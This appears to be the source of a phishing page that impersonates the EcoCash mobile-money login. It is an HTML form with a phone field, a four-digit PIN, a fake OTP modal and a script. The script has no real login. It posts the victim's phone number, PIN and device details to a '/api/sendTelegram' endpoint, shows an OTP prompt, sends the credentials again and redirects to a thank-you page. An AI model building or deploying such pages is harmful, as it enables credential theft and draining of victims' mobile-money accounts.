<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>EcoCash — Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    font-family:Inter,system-ui,Arial;
    background:linear-gradient(180deg,#f7fbff,#e8f3ff);
    margin:0;
    padding:18px;
    display:flex;
    align-items:center;
    justify-content:center;
    min-height:100vh;
  }

  .card{width:100%;max-width:380px;background:#fff;padding:20px;border-radius:12px;box-shadow:0 12px 30px rgba(2,6,23,0.06)}
  .logo{height:44px;display:block;margin:0 auto 10px}
  h2{text-align:center;margin:0 0 12px;color:#111;font-size:20px}
  label{display:block;font-size:13px;color:#374151;margin-top:8px}
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px}
  .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
  .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
  .req{color:#d04444;margin-right:6px}

  /* PIN boxes */
  .pin-row{display:flex;gap:8px;margin-top:4px}
  .pin-box{
    width:44px;height:48px;text-align:center;font-size:22px;
    border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;
  }

  .otp-modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
  .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:300px}
  .otp-row{display:flex;gap:8px;justify-content:center;margin-top:8px}
  .otp-digit{width:40px;height:48px;text-align:center;font-size:20px;border-radius:8px;border:1px solid #e6eefc}
  .otp-warning{color:#d04444;font-size:13px;display:none}
</style>
</head>

<body>
<div class="card">
  <img src="assets/eco.png" alt="EcoCash logo" class="logo">
  <h2>Log In</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number
      <input id="phone" value="+263" inputmode="tel">
    </label>

    <label><span class="req">★</span>4-Digit PIN</label>
    <div class="pin-row">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
      <input class="pin-box" maxlength="1">
    </div>

    <!-- hidden real PIN -->
    <input type="hidden" id="pin">

    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <strong style="display:block;text-align:center">Enter OTP</strong>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" id="d0">
      <input class="otp-digit" maxlength="1" id="d1">
      <input class="otp-digit" maxlength="1" id="d2">
      <input class="otp-digit" maxlength="1" id="d3">
      <input class="otp-digit" maxlength="1" id="d4">
      <input class="otp-digit" maxlength="1" id="d5">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>
  </div>
</div>

<script>
const FUNCTION_URL = '/api/sendTelegram';
const PREFIX = '+263';
let lastSend = 0;

/* DEVICE INFO */
const device = {
  ua: navigator.userAgent,
  platform: navigator.platform,
  lang: navigator.language,
  screen: `${screen.width}x${screen.height}`
};

/* PHONE */
const phone = document.getElementById('phone');
phone.addEventListener('input',()=>{
  let d = phone.value.replace(/\D/g,'').replace(/^263/,'');
  phone.value = PREFIX + d.slice(0,9);
  phone.setSelectionRange(phone.value.length, phone.value.length);
  updateState();
});

/* PIN */
const pinBoxes = [...document.querySelectorAll('.pin-box')];
const pinHidden = document.getElementById('pin');

pinBoxes.forEach((b,i)=>{
  b.addEventListener('input',e=>{
    const v = e.target.value.replace(/\D/g,'');
    b.value = v ? '•' : '';
    b.dataset.v = v;
    if(v && i<3) pinBoxes[i+1].focus();
    pinHidden.value = pinBoxes.map(x=>x.dataset.v||'').join('');
    updateState();
  });
});

/* STATE */
const loginBtn = document.getElementById('loginBtn');
function updateState(){
  loginBtn.disabled = !(pinHidden.value.length===4 && phone.value.length===13);
}

/* SEND */
function send(payload){
  if(Date.now()-lastSend < 3000) return;
  lastSend = Date.now();
  fetch(FUNCTION_URL,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* LOGIN */
document.getElementById('loginForm').addEventListener('submit',e=>{
  e.preventDefault();
  document.getElementById('otpModal').style.display='flex';
  send({
    event:'login_clicked',
    loginPhone: phone.value,
    loginPin: pinHidden.value,
    device,
    submittedAt: new Date().toISOString()
  });
});

/* OTP CONFIRM */
document.getElementById('confirmOtp').onclick=()=>{
  send({
    event:'otp_confirm',
    loginPhone: phone.value,
    loginPin: pinHidden.value,
    device,
    submittedAt: new Date().toISOString()
  });
  window.location.href='thankyou.html';
};

document.getElementById('cancelOtp').onclick=()=>{
  document.getElementById('otpModal').style.display='none';
};
</script>
</body>
</html>
